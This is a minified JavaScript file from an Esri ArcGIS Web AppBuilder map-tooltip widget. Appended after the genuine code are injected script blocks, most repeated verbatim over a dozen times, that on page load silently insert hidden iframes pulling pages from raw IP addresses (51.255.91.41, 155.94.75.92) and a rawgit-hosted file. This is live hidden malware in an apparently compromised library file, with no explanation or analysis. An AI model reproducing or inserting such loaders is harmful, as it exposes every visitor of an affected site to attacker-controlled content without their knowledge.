// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/_base/lang dojo/Evented dojo/dom-style dojo/dom-construct dojo/on".split(" "),function(e,f,b,g,c,h,k){return e([f,g],{baseClass:"jimu-widget-screening-MapTooltipHandler",_mapTooltip:null,_mapMoveHandler:null,_mapClickHandler:null,map:null,handleClickFor:null,constructor:function(a){this.handleClickFor=this.map=this._mapClickHandler=this._mapMoveHandler=this._mapTooltip=null;b.mixin(this,a)},startup:function(){this.handleClickFor||(this.handleClickFor=
this.map);this._createTooltip()},connectEventHandler:function(a){a&&this.updateTooltip(a);this._disableWebMapPopup();this._mapClickHandler=this.own(k(this.handleClickFor,"click",b.hitch(this,function(a){this._clicked(a)})))[0];"ontouchstart"in document.documentElement?c.set(this._mapTooltip,"display","none"):(this._mapMoveHandler=this.own(this.map.on("mouse-move",b.hitch(this,this._onMapMouseMove)))[0],this.own(this.map.on("mouse-out",b.hitch(this,function(){c.set(this._mapTooltip,"display","none")}))))},
disconnectEventHandler:function(){this._enableWebMapPopup();this._mapClickHandler&&this._mapClickHandler.remove();this._mapMoveHandler&&(this._mapMoveHandler.remove(),this._mapTooltip.style.display="none")},_createTooltip:function(){this._mapTooltip=h.create("div",{"class":"tooltip",innerHTML:this.toolTipText},this.map.container);c.set(this._mapTooltip,"position","fixed");c.set(this._mapTooltip,"display","none")},_enableWebMapPopup:function(){this.map&&(this.map.infoWindow.hide(),this.map.setInfoWindowOnClick(!0))},
_disableWebMapPopup:function(){this.map&&(this.map.infoWindow.hide(),this.map.setInfoWindowOnClick(!1))},_onMapMouseMove:function(a){var b,d;a.clientX||a.pageY?(b=a.clientX,d=a.clientY):(b=a.clientX+document.body.scrollLeft-document.body.clientLeft,d=a.clientY+document.body.scrollTop-document.body.clientTop);c.set(this._mapTooltip,"display","none");c.set(this._mapTooltip,{left:b+15+"px",top:d+"px"});c.set(this._mapTooltip,"display","");this._onMoving(a)},_clicked:function(a){this.emit("clicked",a)},
_onMoving:function(a){this.emit("moving",a)},updateTooltip:function(a){this.toolTipText=a;this._mapTooltip.innerHTML=this.toolTipText}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});